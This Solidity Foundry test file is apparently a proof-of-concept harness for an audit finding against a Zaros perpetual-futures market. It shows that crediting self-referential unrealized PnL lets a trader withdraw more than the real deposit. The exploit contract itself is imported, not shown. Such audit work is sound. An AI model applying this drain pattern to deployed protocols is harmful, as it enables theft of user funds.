// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {MockToken, PerpMarket, Exploit} from "./38003-draining-the-protocol-fully-codehawks-zaros-git.sol";

contract DrainingTheProtocolTest is Test {
    /// @notice CONTROL — without crediting the self-referential unrealized
    ///         PnL (i.e. comparing the required margin against the real
    ///         deposited collateral alone), the SECOND order would already
    ///         be rejected: 1,000,000 real collateral < 1,542,800 required
    ///         margin for the grown position. This isolates the self-
    ///         referential PnL credit as the enabling mechanism.
    function test_withoutPnlCredit_secondOrderWouldFail() public {
        MockToken token = new MockToken();
        PerpMarket market = new PerpMarket(token);
        token.mint(address(this), 1_000_000);
        market.deposit(1_000_000);
        market.fillOrder(92_000);

        // Required margin for the position AFTER a second 60k order at the
        // resulting mark price (computed the same way fillOrder would).
        int256 newMarkPrice = market.markPrice(152_000);
        uint256 requiredMargin = uint256(152_000) * uint256(newMarkPrice) / 100;

        uint256 realCollateralOnly = market.marginBalanceWithoutPnlCredit();
        assertLt(realCollateralOnly, requiredMargin); // 1,000,000 < 1,542,800
    }

    /// @notice HARM — the deployed market DOES credit the self-referential
    ///         PnL, so the same second (and third) order succeeds, and the
    ///         trader ultimately withdraws more than their real deposit
    ///         after triggering their own liquidation.
    function test_drainsMoreThanRealDeposit() public {
        Exploit exploit = new Exploit();
        exploit.run();

        assertEq(exploit.token().balanceOf(address(exploit)), 1_376_740);
        assertGt(exploit.token().balanceOf(address(exploit)), exploit.DEPOSIT_AMOUNT());
    }
}
